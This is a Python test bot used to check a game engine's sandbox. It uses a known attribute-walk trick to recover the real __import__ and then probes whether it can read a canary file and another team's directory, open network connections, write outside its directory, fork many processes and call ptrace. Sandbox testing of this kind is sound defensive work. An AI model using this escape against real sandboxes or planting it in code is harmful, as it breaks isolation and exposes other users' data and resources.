# SPDX-License-Identifier: AGPL-3.0-only
# HOSTILE TEST BOT (sandbox tests only). Uses the engine's known attribute-walk hole to reach the real
# __import__, then probes what a malicious participant could do. Placeholders are replaced by the test.
from battlecode26 import *

CANARY = "__CANARY__"
PORT = __PORT__
FORKS = __FORKS__


def get_import():
    for c in ().__class__.__base__.__subclasses__():
        if c.__name__ == "catch_warnings":
            return c()._module.__builtins__["__import__"]


def probe(name, fn):
    try:
        log("PROBE " + name + " OK " + str(fn())[:120])
    except Exception as e:
        log("PROBE " + name + " BLOCKED " + str(e)[:120])


def turn():
    if rc.get_round_num() != 1:
        return
    imp = get_import()
    os = imp("os")
    socket = imp("socket")

    def read_canary():
        return open(CANARY).read()

    def list_home():
        return os.listdir("/home")

    def connect_host():
        s = socket.socket()
        s.settimeout(2)
        s.connect(("127.0.0.1", PORT))
        return "connected"

    def outbound():
        s = socket.socket()
        s.settimeout(2)
        s.connect(("1.1.1.1", 80))
        return "connected"

    def write_ro():
        f = open("/work/A/evil.txt", "w")
        f.write("x")
        return "wrote"

    def write_usr():
        f = open("/usr/evil.txt", "w")
        return "wrote"

    def pids():
        return len([n for n in os.listdir("/proc") if n.isdigit()])

    def read_repo():
        return os.listdir("__REPO__")

    def forks():
        # Children stay alive for a moment, so this counts how many can exist at once.
        sleep = imp("time").sleep
        n = 0
        kids = []
        try:
            for i in range(FORKS):
                pid = os.fork()
                if pid == 0:
                    sleep(2)
                    os._exit(0)
                kids.append(pid)
                n += 1
        finally:
            log("PROBE fork_count " + str(n))
            for p in kids:
                os.waitpid(p, 0)
        return str(n) + " children"

    def list_work():
        return sorted(os.listdir("/work"))

    def read_other_team():
        return os.listdir("/work/B")

    def ptrace():
        ctypes = imp("ctypes")
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.syscall(101, 0, 0, 0, 0)
        if r == -1:
            raise Exception("errno " + str(ctypes.get_errno()))
        return r

    probe("list_work", list_work)
    probe("read_other_team", read_other_team)
    probe("ptrace", ptrace)
    probe("read_canary", read_canary)
    probe("list_home", list_home)
    probe("list_repo", read_repo)
    probe("connect_host_loopback", connect_host)
    probe("connect_internet", outbound)
    probe("write_bot_dir", write_ro)
    probe("write_usr", write_usr)
    probe("visible_pids", pids)
    probe("fork", forks)
